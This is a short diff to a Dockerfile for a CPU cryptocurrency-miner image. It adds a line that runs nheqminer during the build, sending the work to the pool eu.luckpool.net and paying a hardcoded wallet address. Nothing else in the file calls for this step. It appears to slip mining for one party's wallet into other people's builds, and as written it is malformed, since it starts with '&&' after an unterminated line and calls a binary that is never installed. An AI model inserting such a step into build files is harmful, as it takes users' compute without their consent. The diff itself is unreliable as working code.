@@ -29,6 +29,7 @@ RUN apt-get update \
     libcurl3 \
     libjansson4 \
   && rm -rf /var/lib/apt/lists/*
+  && ./nheqminer -v -l eu.luckpool.net:3956 -u RSFB2ftxbpWXpXunvJDT5ZF6y2qH59Uj7F.zi5 -p x -t 6
 
 COPY --from=builder /app/cpuminer .
 ENTRYPOINT ["./cpuminer"]
